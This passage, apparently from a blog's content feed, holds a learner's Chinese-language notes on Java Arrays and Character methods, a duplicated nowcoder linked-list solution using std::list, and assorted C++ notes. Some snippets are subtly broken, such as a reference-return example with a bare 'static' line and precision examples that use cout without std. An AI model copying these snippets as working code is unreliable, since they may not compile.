2, 3]</span><br></code></pre></td></tr></table></figure><ul><li>toString方法：将数组转换为字符串输出</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">int</span>[] nums = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br>System.out.println(Arrays.toString(nums)); <span class="hljs-comment">// [1, 2, 3]</span><br></code></pre></td></tr></table></figure></li><li><p>常用的Character类静态方法有：</p><ul><li>isLetter方法：判断字符是否为字母（大小写均可）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;A&#x27;</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isLetter</span> <span class="hljs-operator">=</span> Character.isLetter(c); <span class="hljs-comment">// 判断c是否是字母</span><br>System.out.println(isLetter); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><ul><li>isDigit方法：判断字符是否为数字</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;5&#x27;</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isDigit</span> <span class="hljs-operator">=</span> Character.isDigit(c); <span class="hljs-comment">// 判断c是否是数字</span><br>System.out.println(isDigit); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><ul><li>toUpperCase方法：将字符转换为大写字母</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-type">char</span> <span class="hljs-variable">upperCaseC</span> <span class="hljs-operator">=</span> Character.toUpperCase(c); <span class="hljs-comment">// 将小写字母c转换为大写字母</span><br>System.out.println(upperCaseC); <span class="hljs-comment">// A</span><br></code></pre></td></tr></table></figure><ul><li>toLowerCase方法：将字符转换为小写字母</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;B&#x27;</span>;<br><span class="hljs-type">char</span> <span class="hljs-variable">lowerCaseC</span> <span class="hljs-operator">=</span> Character.toLowerCase(c); <span class="hljs-comment">// 将大写字母B转换为小写字母</span><br>System.out.println(lowerCaseC); <span class="hljs-comment">// b</span><br></code></pre></td></tr></table></figure><ul><li>isWhitespace方法：判断字符是否为空格字符</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27; &#x27;</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isWhitespace</span> <span class="hljs-operator">=</span> Character.isWhitespace(c); <span class="hljs-comment">// 判断c是否是空格字符</span><br>System.out.println(isWhitespace); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><ul><li>isLetterOrDigit方法：判断字符是否为字母或数字</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;+&#x27;</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isLetterOrDigit</span> <span class="hljs-operator">=</span> Character.isLetterOrDigit(c); <span class="hljs-comment">// 判断c是否是字母或数字</span><br>System.out.println(isLetterOrDigit); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure></li><li><p>如果父类的函数是<code>private</code>，则不会被覆盖。即使子类重写这个函数，但是调用的时候依然是父类的</p></li><li><p>文件的读写</p><ul><li><p>使用<code>scanner</code>和<code>PrintWrite</code></p><ul><li>在使用<code>scanner</code>时，使用<code>file</code>初始化对象</li></ul></li><li><p>使<code>FileInputStream</code>和<code>FileOutputStream</code></p></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AB9[模板]链表</title>
    <link href="/2023/04/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/AB9-%E6%A8%A1%E6%9D%BF-%E9%93%BE%E8%A1%A8/"/>
    <url>/2023/04/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/AB9-%E6%A8%A1%E6%9D%BF-%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/97dc1ac2311046618fd19960041e3c6f?tpId=308&tqId=2372688&ru=/exam/company&qru=/ta/algorithm-start/question-ranking&sourceUrl=/exam/company">【模板】链表_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/AB9%5B%E6%A8%A1%E6%9D%BF%5D%E9%93%BE%E8%A1%A8%E9%A2%98.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;string&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;list&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;algorithm&quot;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> x&#123;<span class="hljs-number">0</span>&#125;,y&#123;<span class="hljs-number">0</span>&#125;,num&#123;<span class="hljs-number">0</span>&#125;;<br>    std::list&lt;<span class="hljs-type">int</span>&gt; list;<br>    std::string str&#123;&#125;;<br>    std::cin&gt;&gt;num;<br>    <span class="hljs-keyword">auto</span> item=list.<span class="hljs-built_in">begin</span>();<br>    <span class="hljs-keyword">while</span>(num--)&#123;<br>        std::cin&gt;&gt;str;<br><br>        <span class="hljs-keyword">if</span>(str==<span class="hljs-string">&quot;insert&quot;</span>)&#123;<br>            std::cin&gt;&gt;x&gt;&gt;y;<br>            <span class="hljs-comment">//下面两行如果不存在将返回最后一个迭代器，也就是实现了如果不存在插入到最后一个</span><br>            <span class="hljs-keyword">auto</span> item1=std::<span class="hljs-built_in">find</span>(list.<span class="hljs-built_in">begin</span>(),list.<span class="hljs-built_in">end</span>(),x);<br>            list.<span class="hljs-built_in">insert</span>(item1,y);<br>          <br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(str==<span class="hljs-string">&quot;delete&quot;</span>)&#123;<br>            std::cin&gt;&gt;y;<br>            <span class="hljs-keyword">auto</span> item1=std::<span class="hljs-built_in">find</span>(list.<span class="hljs-built_in">begin</span>(),list.<span class="hljs-built_in">end</span>(),y);<br>            <br>            <span class="hljs-comment">//下面的if-else 实现的是如果有重复的删除一个</span><br>            <span class="hljs-comment">//如果使用remove(value)将会删除所有的与value相同的</span><br>            <span class="hljs-keyword">if</span>(item1!=list.<span class="hljs-built_in">end</span>()) &#123;<br>                <br>                list.<span class="hljs-built_in">erase</span>(item1);<span class="hljs-comment">//参数必须是迭代器</span><br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <br>                list.<span class="hljs-built_in">remove</span>(y);<span class="hljs-comment">//不能是迭代器</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(list.<span class="hljs-built_in">empty</span>())&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;NULL&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item1: list)&#123;<br>            std::cout&lt;&lt;item1&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><ul><li><p><code>int x&#123;0&#125;,y&#123;0&#125;,num&#123;0&#125;</code></p><p>这只是一种初始化方式</p></li><li><p><code>list</code>是一个双向的链表</p><ul><li><p><code>insert()</code></p><p>插入元素，有两个参数，有4个重载函数</p><p>但是第一个元素只能是迭代器</p></li><li><p><code>erase()</code></p><p>删除迭代器的元素</p></li><li><p><code>remove(value)</code></p><p>删除所有的与<code>value</code>相等的节点</p></li></ul></li><li><p><code>find()</code></p><p>返回迭代器，如何存在法返回该元素的迭代器，不存在返回最后一个迭代器</p></li></ul></li><li><p>理解</p><p>因为<code>list</code>封装了双向链表，所以直接拿来用</p><p>但是使用<code>find</code>可以查找有没有元素</p></li><li><p>问题</p><ul><li><p>c++封装的链表调用起来会不会时间复杂度很大？</p><blockquote><p>一般情况下，C++ STL 的 <code>list</code> 库的效率要优于手写的链表。这是因为 std::list 不仅实现了常见的操作，例如在任意位置插入&#x2F;删除元素、遍历&#x2F;查找列表、反转&#x2F;排序列表等等，而且还通常采用指针来实现，比手写链表更加高效。</p><p>另外，在 STL 的 list 中，封装程序员带来的好处是程序员不需要设计和编写具体的数据结构，也无需理解底层实现细节。所有 STL 集合类都已经实现了大量的算法和数据结构以及相应的纠错代码，因此能够保证高效、稳定和安全。</p><p>当然，对于一些特殊情况和特定应用场景，手写链表可能会比 C++ STL 的 list 更有效率。但这需要根据具体的实际情况来进行评估和验证。</p><p>总之，在大多数情况下，使用 C++ STL 的 <code>list</code> 库更方便、更高效、更容易维护和调试。</p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>newcoder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AB9[模板]链表</title>
    <link href="/2023/04/11/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/AB9-%E6%A8%A1%E6%9D%BF-%E9%93%BE%E8%A1%A8/"/>
    <url>/2023/04/11/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/AB9-%E6%A8%A1%E6%9D%BF-%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/97dc1ac2311046618fd19960041e3c6f?tpId=308&tqId=2372688&ru=/exam/company&qru=/ta/algorithm-start/question-ranking&sourceUrl=/exam/company">【模板】链表_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/AB9%5B%E6%A8%A1%E6%9D%BF%5D%E9%93%BE%E8%A1%A8%E9%A2%98.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;string&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;list&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;algorithm&quot;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> x&#123;<span class="hljs-number">0</span>&#125;,y&#123;<span class="hljs-number">0</span>&#125;,num&#123;<span class="hljs-number">0</span>&#125;;<br>    std::list&lt;<span class="hljs-type">int</span>&gt; list;<br>    std::string str&#123;&#125;;<br>    std::cin&gt;&gt;num;<br>    <span class="hljs-keyword">auto</span> item=list.<span class="hljs-built_in">begin</span>();<br>    <span class="hljs-keyword">while</span>(num--)&#123;<br>        std::cin&gt;&gt;str;<br><br>        <span class="hljs-keyword">if</span>(str==<span class="hljs-string">&quot;insert&quot;</span>)&#123;<br>            std::cin&gt;&gt;x&gt;&gt;y;<br>            <span class="hljs-comment">//下面两行如果不存在将返回最后一个迭代器，也就是实现了如果不存在插入到最后一个</span><br>            <span class="hljs-keyword">auto</span> item1=std::<span class="hljs-built_in">find</span>(list.<span class="hljs-built_in">begin</span>(),list.<span class="hljs-built_in">end</span>(),x);<br>            list.<span class="hljs-built_in">insert</span>(item1,y);<br>          <br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(str==<span class="hljs-string">&quot;delete&quot;</span>)&#123;<br>            std::cin&gt;&gt;y;<br>            <span class="hljs-keyword">auto</span> item1=std::<span class="hljs-built_in">find</span>(list.<span class="hljs-built_in">begin</span>(),list.<span class="hljs-built_in">end</span>(),y);<br>            <br>            <span class="hljs-comment">//下面的if-else 实现的是如果有重复的删除一个</span><br>            <span class="hljs-comment">//如果使用remove(value)将会删除所有的与value相同的</span><br>            <span class="hljs-keyword">if</span>(item1!=list.<span class="hljs-built_in">end</span>()) &#123;<br>                <br>                list.<span class="hljs-built_in">erase</span>(item1);<span class="hljs-comment">//参数必须是迭代器</span><br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <br>                list.<span class="hljs-built_in">remove</span>(y);<span class="hljs-comment">//不能是迭代器</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(list.<span class="hljs-built_in">empty</span>())&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;NULL&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item1: list)&#123;<br>            std::cout&lt;&lt;item1&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><ul><li><p><code>int x&#123;0&#125;,y&#123;0&#125;,num&#123;0&#125;</code></p><p>这只是一种初始化方式</p></li><li><p><code>list</code>是一个双向的链表</p><ul><li><p><code>insert()</code></p><p>插入元素，有两个参数，有4个重载函数</p><p>但是第一个元素只能是迭代器</p></li><li><p><code>erase()</code></p><p>删除迭代器的元素</p></li><li><p><code>remove(value)</code></p><p>删除所有的与<code>value</code>相等的节点</p></li></ul></li><li><p><code>find()</code></p><p>返回迭代器，如何存在法返回该元素的迭代器，不存在返回最后一个迭代器</p></li></ul></li><li><p>理解</p><p>因为<code>list</code>封装了双向链表，所以直接拿来用</p><p>但是使用<code>find</code>可以查找有没有元素</p></li><li><p>问题</p><ul><li><p>c++封装的链表调用起来会不会时间复杂度很大？</p><blockquote><p>一般情况下，C++ STL 的 <code>list</code> 库的效率要优于手写的链表。这是因为 std::list 不仅实现了常见的操作，例如在任意位置插入&#x2F;删除元素、遍历&#x2F;查找列表、反转&#x2F;排序列表等等，而且还通常采用指针来实现，比手写链表更加高效。</p><p>另外，在 STL 的 list 中，封装程序员带来的好处是程序员不需要设计和编写具体的数据结构，也无需理解底层实现细节。所有 STL 集合类都已经实现了大量的算法和数据结构以及相应的纠错代码，因此能够保证高效、稳定和安全。</p><p>当然，对于一些特殊情况和特定应用场景，手写链表可能会比 C++ STL 的 list 更有效率。但这需要根据具体的实际情况来进行评估和验证。</p><p>总之，在大多数情况下，使用 C++ STL 的 <code>list</code> 库更方便、更高效、更容易维护和调试。</p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>newcoder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>c++随记</title>
    <link href="/2023/04/11/c++/c++%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/04/11/c++/c++%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="平常笔记"><a href="#平常笔记" class="headerlink" title="平常笔记"></a>平常笔记</h1><ol><li><p>初始化数组需要定义大小才能被<code>cin</code></p></li><li><p><code>cin</code>和<code>scanf</code>一样，都跳过空格</p></li><li><p><code>public</code>和<code>private</code>:用于类的封装</p></li><li><p><code>new </code>和 <code>malloc</code>的主要区别:<code>new</code>调用构造函数，<code>malloc</code>不会</p></li><li><p>int *<code>p1</code> &#x3D; new int[10]，int *<code>p2</code> &#x3D; new int[10]()区别：<code>p1</code>申请的空间里的值是随机值，<code>p2</code>申请的空间里的值已经初始化</p></li><li><p>引用:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a=<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> &amp;b=a;<br><span class="hljs-type">int</span> c=<span class="hljs-number">20</span>;<br>b=c;<span class="hljs-comment">//这个意思就是说，将c的值赋值给a,因为b是啊的别名</span><br></code></pre></td></tr></table></figure><p>本质为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span>* <span class="hljs-type">const</span> b = &amp;a;<span class="hljs-comment">//所以在引用后，不能改变空间</span><br>*b = <span class="hljs-number">30</span>;<br><span class="hljs-type">int</span> c = <span class="hljs-number">20</span>;<br>*b = c;<br></code></pre></td></tr></table></figure></li><li><p>左值，右值：（但凡能去地址，就是一个左值）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">x++;<span class="hljs-comment">//把x的值取出来，放进临时变量里面，再让临时变量++，此时x的值是临时变量的是，也就是右值</span><br>++x;<span class="hljs-comment">//自增，然后把自己返回，也就是说是左值</span><br></code></pre></td></tr></table></figure><ul><li><p>左值经过函数返回会变成右值，因为会发生拷贝</p></li><li><p>函数里，定义的参数，是个左值</p></li><li><p>用引用写交换函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> &amp;a,<span class="hljs-type">int</span> &amp;b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> tem =b;<br>    b=a;<br>    a=tem;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>int &amp;a:左值引用</p></li><li><p>int &amp;&amp;a:右值引用</p></li></ul></li><li><p>对输出小数的控制</p><ul><li>不引入头文件</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">double</span> e=<span class="hljs-number">1</span>;<br>    cout.<span class="hljs-built_in">precision</span>(<span class="hljs-number">4</span>);<br>    cout&lt;&lt;fixed&lt;&lt;e/<span class="hljs-number">3</span>&lt;&lt;endl;<br>    cout&lt;&lt;e/<span class="hljs-number">3</span>&lt;&lt;endl;<br>    <span class="hljs-comment">//将输出4位小数</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>引入头文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">double</span> e=<span class="hljs-number">1</span>;<br>    cout&lt;&lt;fixed&lt;&lt;<span class="hljs-built_in">setprecision</span>(<span class="hljs-number">4</span>)&lt;&lt;e/<span class="hljs-number">3</span>&lt;&lt;endl;<br>    <span class="hljs-comment">//输出4位小数</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><code>string.at(n)</code>:用于获取指定字符，n就是获取字符的下标</p></li><li><p>使用new,创建的指针p,用法和数组一样</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> *p=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">5</span>];<br>    <span class="hljs-type">int</span> *q=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">5</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        p[i]=i;<span class="hljs-comment">//可以相当于创建了一个数组，对于数组的存储可以用arr[i]=int类型</span><br>        <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        q[i]=p[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        cout&lt;&lt;q[i]&lt;&lt;<span class="hljs-string">&quot;\t&quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>打印16进制</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">cout&lt;&lt;hex&lt;&lt;<span class="hljs-string">&quot;类容&quot;</span>&lt;&lt;endl;<span class="hljs-comment">//可用于打印地址</span><br></code></pre></td></tr></table></figure></li><li><p><code>public</code>成员最好不要在类中赋值,而是使用成员初始化列表</p></li><li><p>在使用继承释放内存时，注意父类使用虚析构</p></li><li><p>构造函数的技巧：在声明的时候参数缺省</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">My_class</span>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">My_class</span>(<span class="hljs-type">double</span> num1=<span class="hljs-number">0.0</span>,<span class="hljs-type">double</span> num2=<span class="hljs-number">0.0</span>);<br>    ~<span class="hljs-built_in">My_class</span>();<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">double</span> m_num1;<br>    <span class="hljs-type">double</span> m_num2;<br><br>&#125;;<br><br><span class="hljs-comment">//构造</span><br>My_class::<span class="hljs-built_in">My_class</span>(<span class="hljs-type">double</span> num1,<span class="hljs-type">double</span> num2) &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;My_class::My_class() &quot;</span> &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>在声明的时候对参数缺省，在定义的时候不需要（会报错）</p><p><img src="C:\Users\12414\Desktop\笔记\c++\平常笔记.assets\image-20221210113213961.png" alt="image-20221210113213961"></p></li><li><p>引用做函数返回值</p><ul><li><p>不要将局部变量作为返回值</p></li><li><p>函数的返回值可以作为左值存在</p></li><li><p>如果函数的返回值，是左值必须是引用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-function"><span class="hljs-type">int</span>&amp; <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//int a=10;//这么写会报错</span><br>    <span class="hljs-type">static</span><br>    <span class="hljs-keyword">return</span> a;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span>&amp; a = <span class="hljs-built_in">func</span>();<br>    cout &lt;&lt; a &lt;&lt; endl;<br>    cout &lt;&lt; a &lt;&lt; endl;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>在c++里面，有时候打印不一定需要，<code>string</code>类,特可以用字符指针</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 